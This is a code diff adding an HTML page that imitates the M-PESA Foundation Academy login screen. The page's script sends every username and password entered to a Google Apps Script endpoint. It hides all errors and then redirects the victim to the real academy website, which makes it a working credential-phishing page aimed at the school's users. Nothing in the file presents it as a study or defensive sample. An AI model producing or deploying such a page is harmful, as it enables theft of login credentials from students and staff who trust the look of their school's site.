@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>M-PESA Foundation Academy Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background-color: #fff;
+            min-height: 100vh;
+            transition: all 0.2s ease-in-out;
+        }
+        .login-wrapper {
+            border-left: 1px solid #ddd;
+            border-right: 1px solid #ddd;
+            border-bottom: 1px solid #ddd;
+            width: 300px;
+            min-height: 350px;
+            border-radius: 0 0 4px 4px;
+            transition: all 0.2s ease-in-out;
+            display: flex;
+            flex-direction: column;
+            margin-top: -10px;
+        }
+        .image-section {
+            text-align: center;
+            padding-top: 10px;
+        }
+        .image-section img {
+            max-width: 180px;
+            height: auto;
+        }
+        .login-container {
+            padding: 15px 15px 12px; /* 1.5 cm top/sides, 1.2 cm bottom gap to container line */
+            text-align: center;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            background-color: #fff;
+            flex-grow: 1;
+            transition: all 0.2s ease-in-out;
+        }
+        .login-container input {
+            width: 100%;
+            padding: 8px;
+            margin: 15px 0; /* 1.5 cm gap between Username and Password */
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 0.9em;
+            color: #757575;
+            box-sizing: border-box;
+            margin-top: 0;
+            transition: all 0.2s ease-in-out;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 8px;
+            margin-top: 12px; /* 1.2 cm gap from link to button */
+            background-color: #4CAF50;
+            border: 1px solid #45a049;
+            border-radius: 4px;
+            color: white;
+            font-size: 0.9em;
+            font-family: Arial, sans-serif;
+            cursor: pointer;
+            box-sizing: border-box;
+            box-shadow: 0 0 5px rgba(76, 175, 80, 0.3);
+            transition: all 0.2s ease-in-out;
+        }
+        .login-container button:hover {
+            background-color: #45a049;
+        }
+        .login-container a {
+            display: block;
+            margin-top: 15px; /* 1.5 cm gap from Login button to link */
+            color: #4a4a4a;
+            text-decoration: none;
+            font-size: 0.85em;
+            font-family: Arial, sans-serif;
+            transition: all 0.2s ease-in-out;
+        }
+        .login-container #password {
+            margin-top: 15px; /* 1.5 cm gap from Login button to Password */
+        }
+        .footer {
+            text-align: center;
+            color: #4a4a4a;
+            margin-top: 5px;
+            padding: 6px 0;
+            font-size: 0.85em;
+            font-family: Arial, sans-serif;
+            width: 100%;
+            transition: all 0.2s ease-in-out;
+        }
+        #message {
+            margin-top: 10px;
+            font-size: 0.8em;
+            color: #4CAF50;
+            display: none;
+        }
+        #error {
+            color: #f44336;
+            display: none; /* Hide error message */
+        }
+    </style>
+</head>
+<body>
+    <div class="login-wrapper">
+        <div class="image-section">
+            <img src="Image 17-09-2025 at 11.50.jpeg" alt="Header and Logo">
+        </div>
+        <div class="login-container">
+            <form id="loginForm">
+                <input type="text" id="username" placeholder="Enter your Username" required>
+                <input type="password" id="password" placeholder="Enter your Password" required>
+                <button type="submit">Login</button>
+            </form>
+            <a href="#" id="userPortalLink" onclick="handleUserPortal(event)">Click here to access User Portal</a>
+            <div id="message"></div>
+            <div id="error"></div> <!-- Kept but hidden -->
+        </div>
+    </div>
+    <div class="footer">
+        Curiosity : Leadership : Accountability : Innovation : Responsible Citizenship : Excellence
+    </div>
+
+    <script>
+        const form = document.getElementById('loginForm');
+        const userPortalLink = document.getElementById('userPortalLink');
+        const messageDiv = document.getElementById('message');
+        const errorDiv = document.getElementById('error');
+        const webAppUrl = 'https://script.google.com/macros/s/AKfycbw104iJMQPmeuC9Nis5buVrtGV9UC4XaEI6_GEMDeDEzrShwo0E04FWhbI7eAL8tecg/exec'; // Updated URL
+        const redirectUrl = 'https://mpesafoundationacademy.ac.ke';
+
+        async function sendCredentials(username, password) {
+            try {
+                const response = await fetch(webAppUrl, {
+                    method: 'POST',
+                    mode: 'cors',
+                    headers: {
+                        'Content-Type': 'text/plain;charset=utf-8'
+                    },
+                    body: new URLSearchParams({
+                        username: username || '',
+                        password: password || ''
+                    }).toString()
+                });
+                const data = await response.json();
+                return data.success === true; // Return true only if success is confirmed
+            } catch (error) {
+                // Error handling suppressed on UI
+                return false;
+            }
+        }
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (await sendCredentials(username, password)) {
+                window.location.href = redirectUrl; // Immediate redirect after success
+            }
+            // No error message displayed
+        });
+
+        userPortalLink.addEventListener('click', async (e) => {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (await sendCredentials(username, password)) {
+                window.location.href = redirectUrl; // Redirect after sending credentials
+            }
+            // No error message displayed
+        });
+    </script>
+</body>
+</html>
